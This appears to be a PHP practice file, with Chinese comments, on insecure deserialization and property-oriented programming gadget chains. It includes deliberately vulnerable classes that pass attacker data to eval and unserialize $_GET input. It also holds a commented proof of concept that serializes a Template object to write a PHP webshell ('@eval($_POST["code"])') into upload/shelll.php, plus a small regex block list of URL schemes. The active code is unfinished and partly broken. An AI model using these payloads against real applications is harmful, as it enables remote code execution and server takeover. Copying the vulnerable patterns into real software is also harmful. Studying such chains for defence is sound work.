<?php

//basic.php
// class Test{
//     public $phone = '';
//     var $ip = '';
// }

// $t = new Test();
// $t->phone = 'phpinfo();';
// $t->ip = '127.0.0.2';
// echo serialize($t);
    
    
// class People {
//     var $name = '';
//     var $sex = '';
//     var $age = 0;
//     var $addr = '';
// }
// $p = new People();
// echo serialize($p);
    


//ustest.php
//pop,简化后的poc面向属性编程
// class Woniu {
//     private $a;
//     function __construct(){
//         $this->a = new Vul();   //改变调用的方法,可控点
//     }
// }
// class Vul {
//     protected $data='system("pwd");';   //改变变量的值，可控点
//     function hello(){   //改变调用的函数，可控点(被动改变)
//         @eval($this->data);
//     }
// }

// echo urlencode(serialize(new Woniu()));
    


//ustest2.php
class Template{
    var $cacheFile = "upload/shelll.php";
    var $template = "<div>Welcome back clc</div>";
    function __construct(){
        $data = serialize(array("name"=>"ttt","xxx"=>'999'));
        $data = $this->loadData($data);
        $this->render($data);   //理解为一个实例
    }
    function loadData($data) {
        return unserialize($data);   //$data值是一个序列化结果
    }
    function createCache($file = null, $tpl = null) {
        $file = $file ?: $this->cacheFile;   //三元运算符 ?: ,A?B:C，如果A,则B,否则C；A?:B，如果A,则A,否则B
        $tpl = $tpl ?: $this->template;
        file_put_contents($file, $tpl);   //在file文件里面输出tpl
    }
    function render($data) {
        echo sprintf($this->template, htmlspecialchars($data['name']));
    }
    function __destruct() {
        $this->createCache();
    }

}
// echo serialize(array(new Template()));
// echo urlencode(serialize(array(new Template())));

// poc
// class Template{
//     var $cacheFile = "upload/shelll.php";
//     var $template = '<?php @eval($_POST["code"]);';
// }
// $a = new Template();
// $b = array($a);
// echo urlencode(serialize($b));
// // echo serialize($b);




//ustest3.php
class Tiger{
    public $string;
    protected $var;
    public function __toString(){
        return $this->string;
    }
    public function boss($value){
        @eval('phpinfo();');    //目标利用点
    }
    public function __invoke(){
        $this->boss($this->var);
//         echo 'ok';
    }
}
class Lion{
    public $tail;
    public function __construct(){
    $this->tail = array();
    }
    public function __get($value){
        $this->tail = new Tiger();
        echo 'hhh.<br/>';
//         $function = $this->$tail;
//         return $function();
    }
}
class Monkey{
    public $head;
    function test()
    {
//         $this->head = $head;
        echo 'test';
        if(preg_match('/^hello$/',$this->head)){
            $this->source = 'nnn';
            echo '666';
        }   //head为类，类转字符串
        else{
            echo "no";
        }
    }
}

class Test{
    public function __toString()
    {
        echo "to String";
        return "Hi";
    }
}

$m = new Lion();
// $m = (new Lion()) -> source;
echo serialize($m -> source);
// $x = new Tiger();
// $m->head = 'hello';
// echo serialize($m->source);
// // $m->head = new Test();
// $m->test();


// class Tiger{
//     public $string;
//     protected $var;
//     public function __toString(){
//         return $this->string;
//     }
//     public function boss($value){
//         @eval('phpinfo();');    //目标利用点
//     }
//     public function __invoke(){
//         $this->boss($this->var);
//     }
// }
// class Lion{
//     public $tail;
//     public function __construct(){
//     $this->tail = array();
//     }
//     public function __get($value){
//         $function = $this->tail;
//         return $function();
//     }
// }
// class Monkey{
//     public $head;
//     public $hand;
//     public function __construct($here="zoo"){
//         $this->head = $here;
//         echo "welcome to ".$this->head."<br>";
//     }
//     public function __wakeup(){   //起点
//         if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->head)) {   //触发__toString
//             echo "hacker";
//             $this->source = "index.php";   //source不赋值便可触发__toString
//         }
//     }
// }
// class Elephant{
//     public $nose;
//     public $nice;
//     public function __construct($nice="nice"){
//         $this->nice = $nice;
//         echo $nice;
//     }
//     public function __toString(){
//         return $this->nice->nose;   //不存在，调用__get
//     }
// }

// if(isset($_GET['zoo'])){
//     @unserialize($_GET['zoo']);
// }
// else{
//     $a = new Monkey;
//     echo "Hello PHP!";
// }


// $m = new Monkey()
// $m->head = 'http';
// $aa = $m->source->xxxx;
// echo serialize($m->source);



class Person
{
    private $name;
    private $age;
    function __construct($name="", $age=1)
    {
//         $this->name = $name;
//         $this->age = $age;
//         $this->xxx = 'hhh';
    }
    public function __get($propertyName)
    {   
        echo 123;
        if ($propertyName == "age") {
            if ($this->age > 30) {
                return $this->age - 10;
            } else {
                return $this->$propertyName;
            }
        } else {
            return $this->$propertyName;
        }
    }
}
// $Person = new Person();   // 通过Person类实例化的对象，并通过构造方法为属性赋初值
// $Person = new Person("小明", 60);   // 通过Person类实例化的对象，并通过构造方法为属性赋初值
// echo "姓名：" . $Person->name . "<br>";   // 直接访问私有属性name，自动调用了__get()方法可以间接获取
// echo "年龄：" . $Person->age . "<br>";